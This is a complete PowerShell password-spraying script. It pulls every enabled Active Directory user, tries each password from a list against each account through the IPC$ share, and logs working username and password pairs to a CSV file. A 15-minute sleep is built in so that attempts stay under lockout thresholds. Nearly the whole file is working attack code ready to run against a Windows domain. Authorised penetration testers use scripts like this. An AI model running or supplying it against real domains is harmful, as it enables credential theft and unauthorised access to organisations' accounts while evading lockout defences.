# Retrieve ADUsers and Password Spray Against Them

Import-Module ActiveDirectory

# Set errors to stop, this will prevent false positives in the password spray script
$ErrorActionPreference = 'Stop'

# Set filepaths for variables
$passwords = get-content "c:\temp\passwords.txt" # This is where you'll have your password list
$output = "c:\temp\output_" + (Get-Date -Format "MM-dd-yyyy") + ".csv." # This will be where working passwords are written

# Set variables for domain
$computer = $env:COMPUTERNAME # If you are testing against another domain, change this to a domain connected machine 
$domain = $env:USERDOMAIN # If you are testing against another domain, change this to the domain name
$ou = "*OU=*" # If you only want to pull users from a specific OU

# Set sleep timer
$sleep = 15 * 60 # This is in seconds so 15 * 60 = 15 minutes. Only change the 15 value

# Do the lookup and create the output file (requires the machine you're running this from to be domain connected)
echo "AD-Lookup running, do not close window"
$users = Get-ADUser -filter {Enabled -eq $true} | Where-Object{$_.DistinguishedName -like $ou } | Select-Object SamAccountName

# Start password spraying
foreach($password in $passwords)
{ 
    foreach($user in $users)
    {
        $username = $user.SamAccountName
        echo "Running $password against $username"

        # Try to connect to the IPC share using the password and user specified
        try
        {
            net use \\$computer\IPC$ /user:"$domain\$username" $password
            Add-Content $output "$username, $password"
            net use /delete \\$computer\IPC$
            echo "Password Found! $username\$password"
        }
        catch{}
    }

    # Insert a sleep timer to not lock out domain accounts
    echo "Waiting for next run"
    Start-Sleep -Seconds $sleep
}

echo "Results written to $output"
